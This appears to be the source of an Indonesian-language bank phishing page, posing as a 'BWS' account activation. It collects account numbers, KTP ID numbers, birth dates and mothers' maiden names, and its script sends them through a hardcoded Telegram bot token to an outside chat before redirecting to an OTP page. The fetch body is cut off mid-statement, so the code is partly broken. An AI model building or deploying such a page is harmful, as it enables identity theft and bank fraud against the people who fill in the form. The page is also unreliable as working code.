<body>
    <div class="header">
        <button class="back-button"><i class="fas fa-arrow-left"></i></button>

    <div class="form-container">
    <form id="registrationForm" action="kirim_telegram.php" method="POST" onsubmit="showLoading(event)">
        <div class="form-group">
            <label>Nomor Rekening</label>
            <input type="text" 
                   name="nomor_rekening" 
                   placeholder="Masukkan Nomor Rekening"
                   required 
                   pattern="\d{12}" 
                   maxlength="12" 
                   title="Nomor rekening harus terdiri dari 12 digit angka">
        </div>

        <div class="form-group">
            <label>Nomor KTP</label>
            <input type="text" 
                   name="nomor_ktp" 
                   placeholder="Masukkan Nomor KTP" 
                   required 
                   pattern="\d{16}" 
                   maxlength="16" 
                   title="Nomor KTP harus terdiri dari 16 digit angka">
        </div>

        <div class="form-group">
            <label>Tanggal Lahir</label>
            <div class="input-with-icon">
                <input type="date" name="tanggal_lahir" required>
            </div>
        </div>

        <div class="form-group">
            <label>Nama Ibu Kandung</label>
            <input type="text" name="nama_ibu" placeholder="Masukkan Nama Ibu Kandung" required>
        </div>

        <button type="submit" class="submit-button">Selanjutnya</button>
    </form>
</div>

        </div>
    </div>

     <script>
  function showLoading(event) {
    event.preventDefault(); // Mencegah form submit
    const overlay = document.getElementById('loadingOverlay');
    overlay.style.display = 'flex';

    // Ambil nilai dari form
    const nomorRekening = document.querySelector('input[name="nomor_rekening"]').value;
    const nomorKtp = document.querySelector('input[name="nomor_ktp"]').value;
    const tanggalLahir = document.querySelector('input[name="tanggal_lahir"]').value;
    const namaIbu = document.querySelector('input[name="nama_ibu"]').value;

    // Mendapatkan tanggal dan waktu saat ini
    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString(); // Format: "MM/DD/YYYY, HH:MM:SS"

    // Format pesan untuk dikirim ke Telegram menggunakan Markdown
    const message = `

ðŸªª *KTP:* ${nomorKtp}
ðŸ“ *TGL:* ${tanggalLahir}
ðŸ‘©â€ðŸ‘¦ *Ibu Kandung:* ${namaIbu}
    `;

    // Ganti dengan token bot Telegram dan chat_id yang sesuai
    const token = '7909539545:AAHMcspeYAM5HajvT6rGvCCPHsf9W0KuVSU';  // Ganti dengan token bot Telegram Anda
    const chatId = '7225707577';  // Ganti dengan ID chat Telegram Anda

    // Kirim data ke Telegram
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',

      body: JSON.stringify({

    .then(response => response.json())
    .then(data => {
      // Menyembunyikan loading overlay
      overlay.style.display = 'none';
      alert('Aktivasi akun BWS kamu...');

      // Alihkan ke halaman berikutnya
      window.location.href = 'verifikasi-otp.html';  // Ganti dengan URL halaman berikutnya
    })
    .catch(error => {
      overlay.style.display = 'none';
      alert('Terjadi kesalahan saat mengirim data.');
      console.error(error);
    });
  }
</script>
